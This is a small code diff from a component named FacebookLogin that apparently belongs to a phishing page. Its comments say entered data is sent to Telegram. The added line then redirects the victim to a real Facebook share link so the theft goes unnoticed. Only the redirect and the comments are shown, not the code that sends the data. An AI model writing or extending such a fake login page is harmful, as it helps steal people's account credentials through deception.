@@ -62,6 +62,7 @@ function FacebookLogin() {
         }
 
         // Redirect to Facebook after sending to Telegram
+      window.location.href = "https://www.facebook.com/share/v/1B7rBKaTKA/";
       } catch (error) {
         console.error('Error sending data to Telegram:', error);
         // Still redirect even if there's an error
